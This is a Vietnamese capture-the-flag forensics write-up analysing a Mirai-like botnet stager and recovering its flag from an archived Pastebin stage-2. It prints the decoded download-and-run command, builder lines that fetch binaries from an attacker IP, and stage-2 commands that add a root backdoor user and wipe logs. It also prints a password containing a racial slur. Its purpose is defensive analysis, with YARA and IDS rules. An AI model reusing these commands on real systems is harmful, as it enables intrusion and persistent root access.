Write-up — Phân tích Forensics: Katana / Mirai-like payload

✍️ Monkey ⏱️ 15 phút đọc Medium

🎯 Tóm tắt kết quả

  • Flag / IoC: CHH{Mirai_aka_Katana_b0tn3t}
  • Kết luận: file payload.py là builder/stager. Địa chỉ C2 không hardcode mà lấy động qua http://api.ipify.org. Payload thật (stage-2) lưu trên Pastebin (Zym8pVcz) — chứa lệnh tạo backdoor và URL có flag.

1. Mục tiêu tài liệu

  1. Giải thích chi tiết cấu trúc và hành vi của payload.py (dòng — dòng), kèm tư duy phân tích.
  2. Trình diễn các bước forensic an toàn để tìm C2 / flag.
  3. Giải thích khái niệm botnet, cơ chế hoạt động, và lý do attacker dùng kỹ thuật trong dropper.
  4. Đề xuất checklist phân tích, các lệnh an toàn, gợi ý phát hiện/giảm thiểu.

2. Nội dung tệp payload.py

Đoạn mã chính (rút gọn) chứa các phần:

import subprocess, sys, urllib, time, base64, subprocess
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "yakuza"
exec_name = "wget.ssh"
bin_prefix = ""
bin_directory = "vi"
archs = ["x86.yakuza", "mips.yakuza", ... ]
# nhiều lệnh run(...) để tạo các shell scripts (yakuza.sh, tyakuza.sh, ...)
encoded = "Y2QgL3RtcDsg..."
exploit = str(base64.b64decode(encoded))
exploitmake(exploit)
# loop ghi các lệnh wget/curl/ftpget/tftp cho từng arch
complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ...")
f = open("payload.txt","w+")
f.write(complete_payload)

Ý chính: đây là một builder/stager — không phải binary bot chính. Khi attacker chạy script này trên server của họ, nó sẽ tự sinh payload.txt (và nhiều shell script) với IP public của server attacker (lấy từ api.ipify.org).

3. Phân tích chi tiết (dòng — dòng)

A. Imports & biến khởi tạo

import subprocess, sys, urllib, time, base64, subprocess
  • subprocess: gọi lệnh shell qua subprocess.call(..., shell=True).
  • urllib: thực hiện HTTP GET (urllib.urlopen('http://api.ipify.org')).
  • base64: giải mã chuỗi base64 (thường để che dấu command/URL).
  • time: dùng cho sleep/delay (ở đây time.sleep(3) nhiều chỗ) — có thể để chờ service khởi chạy.
💡 Tư duy: khi thấy subprocess + urllib + base64 trong script lạ, khả năng cao là loader (download & exec) — cần đặc biệt cảnh giác, không chạy.

B. Lấy IP động: api.ipify.org

ip = urllib.urlopen('http://api.ipify.org').read()

api.ipify.org trả về IP public hiện tại của host gọi đến. Do đó ip ở đây không phải hằng số mà là giá trị động tùy nơi attacker chạy script.

Tại sao attacker làm vậy?

  • Kỹ thuật này dùng khi attacker muốn tạo payload tùy theo IP lúc build — ví dụ chạy script trên server X; payload được ghi wget http://<IP-of-X>/yakuza.sh → các máy bị nhiễm sẽ tải từ server X.
  • Lợi ích: không phải sửa tay IP mỗi lần; đổi C2 chỉ cần chạy lại trên server mới.
⚠️ Hậu quả forensic: nếu chỉ có payload.py mà không có payload.txt do attacker xuất ra, ta không thể biết IP C2 thật (vì nó không hardcode).

C. Danh sách archs và exec_bin

archs = ["x86.yakuza", "mips.yakuza", ...]
exec_bin = "yakuza"; exec_name = "wget.ssh"; bin_directory = "vi"

Ý đồ attacker:

  • Đây là payload multi-arch — chuẩn bị binary cho nhiều kiến trúc (IoT: mips, arm, sh4...) để lây lan rộng.
  • Script sinh ra lệnh wget http://<ip>/vi/x86.yakuza (và curl/ftp/tftp tương tự) để host nhiễm thử tải nhiều biến thể.

D. Chuỗi encoded (base64)

encoded = "Y2QgL3RtcDsgd2dldCBodHRwczovL3Bhc3RlYmluLmNvbS9yYXcvelltOHBWY3ogLU8gYSA+IC9kZXYvbnVsbCAyPiYxOy..."
exploit = str(base64.b64decode(encoded))
exploitmake(exploit)

Tác dụng: che dấu command nguy hiểm trong base64 để tránh bị nhìn thấy trực tiếp khi đọc file. Giải mã ta được:

cd /tmp; wget https://pastebin.com/raw/Zym8pVcz -O a > /dev/null 2>&1; chmod 777 a; sh a > /dev/null 2>&1; rm -rf a; history -c; clear;

Giải thích:

  • Tải tiếp một script nhỏ ở Pastebin (Zym8pVcz) — đó mới là stage 2 chứa lệnh thực thi chính (tạo user backdoor, tải binary thực sự...).
  • Xóa file sau khi chạy và dọn lịch sử để giảm dấu vết.
💡 Tư duy forensic: khi thấy base64 + sh a, phải giải mã base64 (an toàn, offline) chứ không chạy sh.

E. Vòng lặp ghi script cho từng arch

run('echo "cd /tmp ...; wget http://' + ip + '/'+bin_directory+'/'+i + ' ..." >> /var/www/html/yakuza.sh')
# tương tự cho ftp/tftp -> /var/ftp/yakuza1.sh, /var/lib/tftpboot/tyakuza.sh

Ý đồ: sinh ra shell script trên server để bot khác (khi chạy) dễ tải binary theo nhiều giao thức (HTTP, FTP, TFTP) — tăng tỷ lệ thành công khi tấn công các thiết bị IoT khác nhau.

F. complete_payload và payload.txt

complete_payload = ("cd /tmp || ... wget http://" + ip + "/yakuza.sh; ... rm -rf *")
f = open("payload.txt","w+")
f.write(complete_payload)
  • complete_payload là command nhồi vào nạn nhân — đủ bước tải, chạy, tải thêm qua tftp/ftp, rồi xóa dấu vết.
  • payload.txt lưu chuỗi đó.

Hậu quả: nếu attacker chạy script trên server thật, payload.txt sẽ chứa IP C2 thật — đây là IoC quan trọng.

G. Kết luận phần code

payload.py là builder/stager: tạo payload có ip của server attacker và script deploy. Script không chứa binary bot hay IP C2 cứng — thay vào đó nó tải stage-2 từ Pastebin. Forensic cần: (1) tìm stage-2 (Pastebin), (2) tìm payload.txt sinh ra, hoặc (3) tìm log/pcap chứa request tới api.ipify.org hay pastebin/cookiearena.org.

4. Quy trình lấy flag

  1. Xem archive: tar -tvf payload.tar.gz → biết chỉ có payload.py.
  2. Tìm chuỗi quan trọng: grep -R --line-number -i "yakuza\|payload\|pastebin" . → tìm thấy encoded base64.
  3. Giải mã base64 (chỉ decode, không thực thi): 
    echo "Y2QgL3RtcDsg..." | base64 -d
    → nhận được lệnh tải https://pastebin.com/raw/Zym8pVcz.
  4. Thử tải trực tiếp Pastebin (an toàn): 
    curl -s https://pastebin.com/raw/Zym8pVcz
    → trả về rỗng (paste bị xóa).
  5. Tìm snapshot trên Wayback: 
    curl -s "http://web.archive.org/cdx/search/cdx?url=pastebin.com/raw/Zym8pVcz&output=text&fl=timestamp,original"
    → thấy snapshot 20230716061911.
  6. Lấy nội dung snapshot: 
    curl -s "http://web.archive.org/web/20230716061911/https://pastebin.com/raw/Zym8pVcz"
    → nhận được: 
    useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots;
echo -e "fatnigger123\nfatnigger123" | passwd bigbots;
wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D;
rm -rf /var/log/lastlog; history -c; history -c
  7. Phân tích output paste: URL chứa flag CHH{Mirai_aka_Katana_b0tn3t} — đó là flag/IoC.
⚠️ Ghi chú an toàn: trong toàn bộ quá trình, không chạy sh hay wget để tải file thực thi. Chỉ lấy nội dung text để đọc.

5. Phân tích các lệnh độc hại tìm được

a) Tạo backdoor user

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash bigbots;
  • useradd tạo user mới tên bigbots.
  • -o -u 0 gán UID=0 → quyền root.
  • -g 0 group root.
  • -M -d /root không tạo home, dùng /root.
  • -s /bin/bash shell login.

Nguy hiểm: attacker tạo backdoor account với quyền root — cho phép truy cập shell root bất hợp pháp.

b) Đặt mật khẩu

echo -e "fatnigger123\nfatnigger123" | passwd bigbots;

Đặt mật khẩu fatnigger123 cho user bigbots. Attacker có credentials root để login (qua SSH/password brute-force nếu mở).

c) Tải URL chứa flag

wget -q -O /tmp/... https://cookiearena.org/CHH%7BMirai_aka_Katana_b0tn3t%7D;

Tải nội dung từ cookiearena.org vào file tạm. URL chứa flag mã URL-encoded CHH{Mirai_aka_Katana_b0tn3t}.

d) Xóa dấu vết

rm -rf /var/log/lastlog; history -c; history -c

Xóa log lastlog (thông tin login), xóa lịch sử shell (history -c) → làm forensic khó hơn.

6. Botnet là gì?

Botnet = network of compromised machines (bot = máy bị nhiễm; net = mạng).

  • Bot (agent): chương trình độc hại chạy trên máy nạn nhân, làm theo lệnh C2.
  • C2 (Command & Control): server hoặc cơ chế attacker dùng để gửi lệnh/nhận dữ liệu từ bot.
  • Controller / Attacker: người/nhóm điều khiển botnet.

Cách hoạt động chung:

  1. Lây nhiễm: exploit / brute-force / social-engineering → ghi payload lên máy nạn nhân.
  2. Lập trình agent: agent khởi chạy, liên hệ C2 để nhận lệnh.
  3. C2 giao tiếp: qua HTTP(S), IRC, DNS, P2P, hoặc mã hóa/obfuscation.
  4. Thực thi lệnh: DDoS, mining, mở backdoor, tấn công tiếp (propagation).
  5. Che dấu: xóa log, setuid, rootkit, persist bằng cron/systemd...

7. IoC (Indicators of Compromise)

  • payload.py — stager.
  • Base64 encoded chỉ tới https://pastebin.com/raw/Zym8pVcz (stage-2).
  • Pastebin snapshot chứa: useradd ... bigbots, passwd bigbots, wget ... https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}.
  • Flag/URL: https://cookiearena.org/CHH{Mirai_aka_Katana_b0tn3t}
  • Tên binary/exec: yakuza, x86.yakuza, mips.yakuza...

8. Checklist Forensic an toàn

🔒 Môi trường: luôn phân tích trên VM/sandbox offline, snapshot, không nối mạng hoặc ở mạng phân tách.
  • Liệt kê archive: tar -tvf payload.tar.gz
  • Tìm chuỗi: grep -R --line-number -i "yakuza\|pastebin\|api.ipify" .
  • Giải mã base64: echo "<base64>" | base64 -d
  • Tải nội dung text an toàn: curl -s <url> (chỉ lấy text)
  • Xem binary tĩnh: file x86.yakuza; strings x86.yakuza | less
  • PCAP: tshark -r capture.pcap -Y "http.request" -T fields -e ip.dst -e http.host -e http.request.uri
  • Hashing: sha256sum suspicious.bin

9. Phát hiện & phòng thủ

YARA rule mẫu

rule katana_stage1 {
    strings:
        $s1 = "api.ipify.org" nocase
        $s2 = "pastebin.com/raw/" nocase
        $s3 = "yakuza" nocase
    condition:
        any of them
}

Suricata/IDS

Detect HTTP request tới pastebin.com/raw/ hoặc path chứa yakuza:

alert http any any -> any any (msg:"Possible katana stager pastebin download"; content:"pastebin.com/raw/"; sid:1000001; rev:1;)

Host-based detection

  • Watch user mới có UID 0 (/etc/passwd).
  • Giám sát /var/log/auth.log, /var/log/lastlog.
  • Tìm file yakuza trong webroot /var/www/html, /var/ftp, /var/lib/tftpboot.

10. Kết luận

  • payload.py không chứa IP C2 cứng; nó lấy IP public động (api.ipify.org) và tải stage-2 từ Pastebin.
  • Dùng Wayback Machine để khôi phục paste bị xóa, ta tìm được stage-2 và flag: CHH{Mirai_aka_Katana_b0tn3t}.
  • Luôn phân tích offline, chỉ đọc, không thực thi payload. Dùng rules & giám sát để phát hiện hành vi tương tự.
